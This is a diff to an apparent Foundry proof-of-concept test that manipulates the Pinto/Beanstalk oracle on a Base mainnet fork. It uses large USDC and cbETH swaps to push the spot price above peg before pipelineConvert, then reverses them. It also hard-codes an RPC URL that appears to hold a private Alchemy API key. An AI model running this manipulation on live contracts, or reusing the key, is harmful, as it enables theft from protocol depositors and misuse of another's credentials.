@@ -85,7 +85,7 @@ contract OracleManipulationPoC is BeanstalkDeployer {
     
     function setUp() public {
         // First fork mainnet at latest block
-        vm.createSelectFork("https://mainnet.base.org");
+        vm.createSelectFork("https://base-mainnet.g.alchemy.com/v2/viNSc9v6D3YMKDXgFyD9Ib8PLFL4crv0", 40729500);
         
         // Then upgrade all facets so the modified LibPipelineConvert with logs is deployed
         upgradeAllFacets(PINTO_DIAMOND, "", new bytes(0));
@@ -118,7 +118,7 @@ contract OracleManipulationPoC is BeanstalkDeployer {
         // --- Scenario A: Normal ---
         console.log("");
         console.log("--- Scenario A: Normal (No Manipulation) ---");
-        vm.prank(DEPOSITOR);
+        vm.startPrank(DEPOSITOR);
         (int96 stemA, , , , uint256 bdvA) = pinto.pipelineConvert(
             PINTO_TOKEN, _wrap(stem), _wrap(amount), PINTO_USDC_WELL, _createPipeCalls(amount)
         );
@@ -132,20 +132,24 @@ contract OracleManipulationPoC is BeanstalkDeployer {
         console.log("Grownstalk amount after 1000 sunrise:", pinto.grownStalkForDeposit(DEPOSITOR, PINTO_USDC_WELL, stemA));
         console.log("Gained grownstalk after 1000 sunrises:", pinto.grownStalkForDeposit(DEPOSITOR, PINTO_USDC_WELL, stemA) - grownA);
 
+        vm.stopPrank();
         vm.revertTo(snapshotId);
+        vm.startPrank(DEPOSITOR);
 
         // --- Scenario B: Manipulated ---
         console.log("");
         console.log("--- Scenario B: Manipulated (Flash Swap) ---");
         console.log(">>> Swapping 1M USDC AND 300 cbETH -> Beans to push spot price ABOVE PEG <<<");
+        console.log("Bean Balance before swaps: ", IERC20(PINTO_TOKEN).balanceOf(DEPOSITOR));
         _doLargeSwap(1_000_000e6); 
         _doLargeCbEthSwap(300 ether);
+        console.log("Bean Balance after swaps: ", IERC20(PINTO_TOKEN).balanceOf(DEPOSITOR));
+
         
         console.log("--- POST-MANIPULATION STATE ---");
         console.log("Spot Overall DeltaB:   ", _formatSigned6(pinto.overallCurrentDeltaB()));
         console.log("TWAP Overall DeltaB:   ", _formatSigned6(pinto.overallCappedDeltaB()));
 
-        vm.prank(DEPOSITOR);
         (int96 stemB, , , , uint256 bdvB) = pinto.pipelineConvert(
             PINTO_TOKEN, _wrap(stem), _wrap(amount), PINTO_USDC_WELL, _createPipeCalls(amount)
         );
@@ -243,32 +247,41 @@ contract OracleManipulationPoC is BeanstalkDeployer {
         address[] memory tokens = IWell(PINTO_USDC_WELL).tokens();
         address pintoToken = tokens[0] == BASE_USDC ? tokens[1] : tokens[0];
         
-        deal(BASE_USDC, address(this), usdcAmount);
+        // Give tokens to DEPOSITOR since prank is active
+        deal(BASE_USDC, DEPOSITOR, usdcAmount);
         IERC20(BASE_USDC).approve(PINTO_USDC_WELL, type(uint256).max);
-        IWell(PINTO_USDC_WELL).swapFrom(BASE_USDC, pintoToken, usdcAmount, 0, address(this), block.timestamp);
+        IWell(PINTO_USDC_WELL).swapFrom(BASE_USDC, pintoToken, usdcAmount, 0, DEPOSITOR, block.timestamp);
     }
 
     function _doLargeCbEthSwap(uint256 cbEthAmount) internal {
-        deal(CBETH, address(this), cbEthAmount);
+        // Give tokens to DEPOSITOR since prank is active
+        deal(CBETH, DEPOSITOR, cbEthAmount);
         IERC20(CBETH).approve(PINTO_CBETH_WELL, type(uint256).max);
-        IWell(PINTO_CBETH_WELL).swapFrom(CBETH, PINTO_TOKEN, cbEthAmount, 0, address(this), block.timestamp);
+        IWell(PINTO_CBETH_WELL).swapFrom(CBETH, PINTO_TOKEN, cbEthAmount, 0, DEPOSITOR, block.timestamp);
     }
 
     function _doReverseSwap() internal {
         // Swap all beans we got from the manipulation back to USDC
-        uint256 beanBalance = IERC20(PINTO_TOKEN).balanceOf(address(this));
+    
+        console.log("usdc balance before reverse swap:", IERC20(BASE_USDC).balanceOf(DEPOSITOR));
+        console.log("bean balance before reverse swap:", IERC20(PINTO_TOKEN).balanceOf(DEPOSITOR));
+        uint256 beanBalance = IERC20(PINTO_TOKEN).balanceOf(DEPOSITOR);
         if (beanBalance > 0) {
             IERC20(PINTO_TOKEN).approve(PINTO_USDC_WELL, type(uint256).max);
-            IWell(PINTO_USDC_WELL).swapFrom(PINTO_TOKEN, BASE_USDC, beanBalance, 0, address(this), block.timestamp);
+            IWell(PINTO_USDC_WELL).swapFrom(PINTO_TOKEN, BASE_USDC, beanBalance, 0, DEPOSITOR, block.timestamp);
         }
+
+        console.log("usdc balance after reverse swap:", IERC20(BASE_USDC).balanceOf(DEPOSITOR));
+        console.log("bean balance after reverse swap:", IERC20(PINTO_TOKEN).balanceOf(DEPOSITOR));
+
     }
 
     function _doReverseCbEthSwap() internal {
         // Swap remaining beans back to cbETH
-        uint256 beanBalance = IERC20(PINTO_TOKEN).balanceOf(address(this));
+        uint256 beanBalance = IERC20(PINTO_TOKEN).balanceOf(DEPOSITOR);
         if (beanBalance > 0) {
             IERC20(PINTO_TOKEN).approve(PINTO_CBETH_WELL, type(uint256).max);
-            IWell(PINTO_CBETH_WELL).swapFrom(PINTO_TOKEN, CBETH, beanBalance, 0, address(this), block.timestamp);
+            IWell(PINTO_CBETH_WELL).swapFrom(PINTO_TOKEN, CBETH, beanBalance, 0, DEPOSITOR, block.timestamp);
         }
     }
 
